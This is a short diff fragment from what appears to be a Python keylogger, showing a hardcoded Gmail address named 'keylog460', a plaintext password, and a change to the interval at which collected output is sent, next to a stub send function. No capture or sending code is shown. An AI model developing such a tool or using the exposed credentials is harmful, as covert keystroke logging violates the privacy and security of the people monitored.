@@ -18,7 +18,7 @@ from queue import Queue
 	
 email = "keylog460@gmail.com"
 passwd = 'TheAllSpark'	
-sendInter = 60*60
+sendInter = 60*60*2
 	
 def sendOutput():
 	print("send")
